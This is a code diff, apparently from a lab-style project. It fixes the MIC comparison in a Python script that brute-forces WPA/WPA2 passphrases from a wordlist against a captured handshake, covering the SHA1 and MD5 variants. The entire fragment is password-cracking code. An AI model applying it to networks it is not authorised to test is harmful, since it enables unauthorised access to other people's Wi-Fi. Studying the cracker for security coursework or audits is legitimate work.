@@ -69,9 +69,13 @@ with open(dictionary, "r") as passphrases:
         ptk = customPRF512(pmk, str.encode(A), B)
 
         # calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK (support for SHA1 and MD5)
-        mic = hmac.new(ptk[0:16], data, hashlib.sha1 if mic_type == 2 else hashlib.md5)
+        if mic_type == 2 :
+            mic = hmac.new(ptk[0:16], data, hashlib.sha1).digest()[:-4] # need the 16 first bytes of Sha-1 digest (20B)
+        else :
+            mic = hmac.new(ptk[0:16], data, hashlib.md5).digest()
+
         index += 1
-        if mic.digest()[:-4] != mic_to_test:
+        if mic != mic_to_test:
             continue
         print("Passphrase found : \"{}\". {} attempts".format(passphrase, index))
 
@@ -83,5 +87,5 @@ with open(dictionary, "r") as passphrases:
         print("KEK:\t\t", ptk[16:32].hex(), "\n")
         print("TK:\t\t", ptk[32:48].hex(), "\n")
         print("MICK:\t\t", ptk[48:64].hex(), "\n")
-        print("MIC:\t\t", mic.hexdigest(), "\n")
+        print("MIC:\t\t", mic.hex(), "\n")
         break
